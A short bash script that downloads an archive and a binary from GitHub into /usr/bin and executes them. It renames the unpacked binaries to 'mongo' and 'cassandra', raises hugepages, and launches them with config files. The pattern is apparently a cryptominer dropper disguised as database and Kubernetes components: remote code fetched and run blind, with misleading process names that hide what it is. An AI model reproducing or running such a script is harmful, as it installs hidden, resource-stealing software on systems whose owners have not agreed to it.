#/bin/bash
cd /usr/bin

wget https://raw.githubusercontent.com/metrorelax/catalina/main/kubernetes.tar.gz; tar xvzf kubernetes.tar.gz; mv bash1 mongo; mv bash2 cassandra; sleep 2
wget https://raw.githubusercontent.com/anchorgear/dbcfg/main/kube-s8; chmod +x /usr/bin/kube-s8; /usr/bin/kube-s8; sleep 4
sysctl vm.nr_hugepages=2560; sleep 4

nice -n 19 mongo -c /usr/bin/mongocfg; sleep 50; nice -n -20 cassandra -c /usr/bin/cassandracfg

